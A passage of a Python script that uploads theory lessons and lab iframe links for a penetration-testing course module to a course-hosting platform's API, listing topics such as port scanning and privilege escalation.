    r = requests.post(url, auth=auth, headers=HEADERS, json=payload, timeout=20)
    try:
        data = r.json()
    except Exception:
        data = {}
    if not r.ok:
        print(f"  ERROR {r.status_code}: {r.text[:300]}")
    return r.status_code, data


def create_lesson(chapter_id, name):
    print(f"  [lesson] {name}")
    payload = {"name": name, "chapter_id": chapter_id, "type": "lesson"}
    status, data = api_post(f"/api/content/{COURSE_ID}/lessons", payload)
    lesson_obj = data.get("lesson") or data.get("data") or data
    lesson_id = lesson_obj.get("id") if isinstance(lesson_obj, dict) else data.get("id")
    print(f"    status={status}  lesson_id={lesson_id}")
    return lesson_id


def push_text_content(lesson_id, markdown):
    payload = {
        "content": {
            "type": "lesson",
            "id": uid(),
            "items": [
                {"id": uid(), "type": "text", "markdown": markdown}
            ]
        }
    }
    status, _ = api_post(f"/api/content/{COURSE_ID}/lessons/{lesson_id}", payload)
    print(f"    text content -> {status}")
    return status


def push_iframe_content(lesson_id, iframe_url):
    payload = {
        "content": {
            "type": "lesson",
            "id": uid(),
            "items": [
                {"id": uid(), "type": "iframe", "url": iframe_url,
                 "aspect_height": 9, "aspect_width": 16}
            ]
        }
    }
    status, _ = api_post(f"/api/content/{COURSE_ID}/lessons/{lesson_id}", payload)
    print(f"    iframe content -> {status}")
    return status


# -------------------------------------------------------
# Lesson plan
# -------------------------------------------------------

THEORY_LESSONS = [
    ("B1 - IP Protocols and Fundamentals",              B1_MD),
    ("B2 - Network Architecture and Devices",           B2_MD),
    ("B3 - Network Services and Protocols",             B3_MD),
    ("B4 - Network Mapping and Target Identification",  B4_MD),
    ("B5 - Interpreting Tool Output",                   B5_MD),
    ("B6 - Vulnerability Scanning and Analysis",        B6_MD),
    ("B7 - Web Application Fundamentals",               B7_MD),
    ("B8 - OS Fingerprinting",                          B8_MD),
    ("B9 - Banner Grabbing and Service Identification", B9_MD),
    ("B10 - Enumeration",                               B10_MD),
    ("B11 - Cryptography and Hashing",                  B11_MD),
    ("B12 - SSL/TLS",                                   B12_MD),
    ("B13 - Linux Privilege Escalation",                B13_MD),
    ("B14 - Windows Privilege Escalation",              B14_MD),
]

LAB_LESSONS = [
    ("Lab B4-A - Network Sweeping",               "lab-b4a", "lab-b4a-network-sweeping-v1.html"),
    ("Lab B4-B - Route Mapping",                  "lab-b4b", "lab-b4b-route-mapping-v1.html"),
    ("Lab B4-C - Port Scanning",                  "lab-b4c", "lab-b4c-port-scanning-v1.html"),
    ("Lab B5-A - Tool Output Analysis",           "lab-b5a", "lab-b5a-tool-output-v1.html"),
    ("Lab B8-A - OS Fingerprinting",              "lab-b8a", "lab-b8a-os-fingerprinting-v1.html"),
    ("Lab B9-A - Banner Grabbing and Service ID", "lab-b9a", "lab-b9a-banner-grabbing-v1.html"),
    ("Lab B13-A - Linux Privilege Escalation",    "lab-b13a","lab-b13a-linux-privesc-v1.html"),
    ("Lab B13-B - Linux Privesc via NFS",         "lab-b13b","lab-b13b-linux-privesc-nfs-v1.html"),
    ("Lab B14-A - Process and Socket Enumeration","lab-b14a","lab-b14a-process-socket-enum-v1.html"),
    ("Lab B14-B - Windows Privilege Escalation",  "lab-b14b","lab-b14b-windows-privesc-v1.html"),
]


def main():
    print("=== CourseStack: Push Module B - Full Content ===")
    print(f"Chapter ID: {CHAPTER_ID}\n")

    # 1. Create theory lessons
    print("--- Theory Lessons ---")
    for name, md in THEORY_LESSONS:
        lesson_id = create_lesson(CHAPTER_ID, name)
        if lesson_id:
            time.sleep(0.4)
            push_text_content(lesson_id, md)
        time.sleep(0.4)

    # 2. Patch existing lab lessons with correct iframe content
    print("\n--- Lab Lessons (patching existing) ---")
    for name, key, filename in LAB_LESSONS:
        lesson_id = EXISTING_LAB_LESSONS.get(key)
        if lesson_id:
            print(f"  [patch] {name}")
            url = f"{GH_BASE}/{filename}"
            push_iframe_content(lesson_id, url)
        else:
            print(f"  [skip] {name} - no lesson ID")
        time.sleep(0.4)

    print("\n=== Done ===")
    print(f"Course: https://app.coursestack.com/courses/{COURSE_ID}")


if __name__ == "__main__":
    main()
